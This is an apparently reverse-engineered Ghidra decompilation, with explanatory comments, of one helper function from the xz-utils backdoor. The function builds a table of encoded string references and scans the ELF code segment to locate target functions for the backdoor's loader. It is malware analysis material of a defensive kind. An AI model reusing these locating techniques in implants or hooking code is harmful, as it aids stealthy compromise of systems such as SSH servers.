// /home/kali/xzre-ghidra/xzregh/102D30_elf_find_string_references.c
// Function: elf_find_string_references @ 0x102D30
// Calling convention: __stdcall
// Prototype: BOOL __stdcall elf_find_string_references(elf_info_t * elf_info, string_references_t * refs)


/*
 * AutoDoc: Builds the 27-entry `string_references_t` catalogue used by the loader heuristics.
 * Seeds each entry with its `EncodedStringId`, walks .rodata via `elf_find_string`, and records the first LEA that materialises each literal with `find_string_reference`.
 * Then sweeps `.text` with `x86_dasm`, tightening each entry's `func_start`/`func_end` around calls, PLT/JMP stubs, and RIP-relative LEAs that target the recorded xrefs, and finally reconciles the ranges against RELA/RELR relocations and the code-segment bounds so later scans can trust the table.
 */

#include "xzre_types.h"

BOOL elf_find_string_references(elf_info_t *elf_info,string_references_t *refs)

{
  void **range_end;
  u8 *entry_xref;
  void *range_xref;
  EncodedStringId string_id_seed;
  BOOL decoded;
  u8 *code_segment_start;
  char *string_ptr;
  u8 *xref_addr;
  void **range_iter;
  u8 *target_addr;
  Elf64_Rela *rela_cursor;
  dasm_ctx_t *scan_ctx;
  u64 entry_offset;
  string_item_t *entry_cursor;
  u8 *code_segment_end;
  void **range_cursor;
  u8 *insn_cursor;
  EncodedStringId string_id_cursor;
  u64 code_segment_size [2];
  dasm_ctx_t scanner_ctx;
  
  string_id_seed = STR_xcalloc_zero_size;
  entry_cursor = refs->entries;
  do {
    ((string_item_t *)&entry_cursor->string_id)->string_id = string_id_seed;
    string_id_seed = string_id_seed + 8;
    entry_cursor = entry_cursor + 1;
  } while (string_id_seed != 0xe8);
  scan_ctx = &scanner_ctx;
  for (entry_offset = 0x16; entry_offset != 0; entry_offset = entry_offset + -1) {
    *(undefined4 *)&scan_ctx->instruction = 0;
    scan_ctx = (dasm_ctx_t *)((long)&scan_ctx->instruction + 4);
  }
  code_segment_size[0] = 0;
  code_segment_size[1] = 0;
  code_segment_start = (dasm_ctx_t *)elf_get_code_segment(elf_info,code_segment_size);
  scan_ctx = &scanner_ctx;
  if ((code_segment_start != (dasm_ctx_t *)0x0) && (0x10 < code_segment_size[0])) {
    code_segment_end = (dasm_ctx_t *)(code_segment_start->opcode_window + (code_segment_size[0] - 0x25));
    string_ptr = (char *)0x0;
    while( TRUE ) {
      string_id_cursor = 0;
      string_ptr = elf_find_string(elf_info,&string_id_cursor,string_ptr);
      if (string_ptr == (char *)0x0) break;
      entry_offset = 0;
      do {
        if (((*(long *)((long)&refs->entries[0].xref + entry_offset) == 0) &&
            (*(EncodedStringId *)((long)&refs->entries[0].string_id + entry_offset) == string_id_cursor)) &&
           (xref_addr = find_string_reference((u8 *)code_segment_start,(u8 *)code_segment_end,string_ptr),
           xref_addr != (u8 *)0x0)) {
          *(u8 **)((long)&refs->entries[0].xref + entry_offset) = xref_addr;
        }
        entry_offset = entry_offset + 0x20;
      } while (entry_offset != 0x360);
      string_ptr = string_ptr + 1;
    }
    range_cursor = &refs->entries[0].func_start;
    range_end = &refs[1].entries[0].func_start;
    range_iter = range_cursor;
    do {
      insn_cursor = (dasm_ctx_t *)range_iter[2];
      if (insn_cursor != (dasm_ctx_t *)0x0) {
        if (code_segment_start <= insn_cursor) {
          if ((dasm_ctx_t *)*range_iter < code_segment_start) {
            *range_iter = code_segment_start;
          }
          if (code_segment_start != insn_cursor) goto LAB_00102e58;
        }
        if (code_segment_start <= (dasm_ctx_t *)((long)range_iter[1] - 1U)) {
          range_iter[1] = code_segment_start;
        }
      }
LAB_00102e58:
      range_iter = range_iter + 4;
      insn_cursor = code_segment_start;
    } while (range_iter != range_end);
LAB_00102e64:
    if (insn_cursor < code_segment_end) {
      decoded = x86_dasm(scan_ctx,(u8 *)insn_cursor,(u8 *)code_segment_end);
      insn_cursor = (dasm_ctx_t *)((long)&insn_cursor->instruction + 1);
      if (decoded != FALSE) {
        insn_cursor = (dasm_ctx_t *)
                  ((u8 *)((long)scanner_ctx.instruction + 0x25) + (scanner_ctx.instruction_size - 0x25));
        if (*(u32 *)&scanner_ctx.opcode_window[3] == 0x168) {
          if (scanner_ctx.imm_signed == 0) goto LAB_00102e64;
          target_addr = (dasm_ctx_t *)
                   ((u8 *)((long)scanner_ctx.instruction + 0x25) +
                   scanner_ctx.imm_signed + scanner_ctx.instruction_size + -0x25);
LAB_00102ee5:
          if (target_addr == (dasm_ctx_t *)0x0) goto LAB_00102e64;
        }
        else {
          target_addr = (dasm_ctx_t *)scanner_ctx.instruction;
          if (*(u32 *)&scanner_ctx.opcode_window[3] == 0xa5fe) goto LAB_00102ee5;
          if (((*(u32 *)&scanner_ctx.opcode_window[3] != 0x10d) || (((byte)scanner_ctx.prefix.decoded.rex & 0x48) != 0x48))
             || (((uint)scanner_ctx.prefix.decoded.modrm & 0xff00ff00) != 0x5000000))
          goto LAB_00102e64;
          target_addr = (dasm_ctx_t *)(insn_cursor->opcode_window + (scanner_ctx.mem_disp - 0x25));
        }
        if ((code_segment_start <= target_addr) && (range_iter = range_cursor, target_addr <= code_segment_end)) {
          do {
            entry_xref = (dasm_ctx_t *)range_iter[2];
            if (entry_xref != (dasm_ctx_t *)0x0) {
              if (target_addr <= entry_xref) {
                if ((dasm_ctx_t *)*range_iter < target_addr) {
                  *range_iter = target_addr;
                }
                if (entry_xref != target_addr) goto LAB_00102f31;
              }
              if (target_addr <= (dasm_ctx_t *)((long)range_iter[1] - 1U)) {
                range_iter[1] = target_addr;
              }
            }
LAB_00102f31:
            range_iter = range_iter + 4;
          } while (range_iter != range_end);
        }
      }
      goto LAB_00102e64;
    }
    while (rela_cursor = elf_find_rela_reloc(elf_info,0,(u64)code_segment_start), range_iter = range_cursor,
          rela_cursor != (Elf64_Rela *)0x0) {
      do {
        range_xref = (Elf64_Rela *)range_iter[2];
        if (range_xref != (Elf64_Rela *)0x0) {
          if (rela_cursor <= range_xref) {
            if ((Elf64_Rela *)*range_iter < rela_cursor) {
              *range_iter = rela_cursor;
            }
            if (rela_cursor != range_xref) goto LAB_00102f8e;
          }
          if (rela_cursor <= (Elf64_Rela *)((long)range_iter[1] - 1U)) {
            range_iter[1] = rela_cursor;
          }
        }
LAB_00102f8e:
        range_iter = range_iter + 4;
      } while (range_iter != range_end);
    }
    do {
      scan_ctx = (dasm_ctx_t *)range_cursor[2];
      if (scan_ctx != (dasm_ctx_t *)0x0) {
        if (code_segment_end <= scan_ctx) {
          if ((dasm_ctx_t *)*range_cursor < code_segment_end) {
            *range_cursor = code_segment_end;
          }
          if (scan_ctx != code_segment_end) goto LAB_00102fad;
        }
        scan_ctx = (dasm_ctx_t *)((long)range_cursor[1] + -1);
        if (code_segment_end <= scan_ctx) {
          range_cursor[1] = code_segment_end;
        }
      }
LAB_00102fad:
      range_cursor = range_cursor + 4;
    } while (range_cursor != range_end);
  }
  return (BOOL)scan_ctx;
}

